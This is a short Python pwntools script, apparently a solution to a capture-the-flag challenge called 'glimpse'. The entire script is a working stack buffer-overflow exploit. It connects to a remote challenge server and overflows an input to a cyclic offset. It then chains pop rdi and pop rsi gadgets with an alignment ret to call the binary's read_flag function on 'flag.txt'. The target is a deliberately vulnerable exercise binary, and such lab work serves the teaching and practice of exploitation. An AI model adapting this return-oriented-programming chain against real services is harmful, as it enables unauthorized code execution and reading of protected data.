#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF("./glimpse", checksec=False)

# p = process(exe.path)
p = remote("0.cloud.chals.io", 14985)

flag_data = next(exe.search(b"flag.txt"))
pop_rdi_ret = 0x00000000004019c2 # pop rdi; ret;
pop_rsi_ret = 0x000000000040f45e # pop rsi; ret;
ret_add = pop_rdi_ret + 1
read_flag = exe.symbols["read_flag"]

# ================ Payload =================
# ====== read_flag("flag.txt", 0xa0) =======
# ==========================================

payload = b"a" * cyclic_find("jaaf")
payload += p64(pop_rdi_ret)
payload += p64(flag_data)

payload += p64(pop_rsi_ret)
payload += p64(0xa0) # Length

payload += p64(ret_add)
payload += p64(read_flag)

# ==========================================

p.sendlineafter(b">", payload)

p.interactive()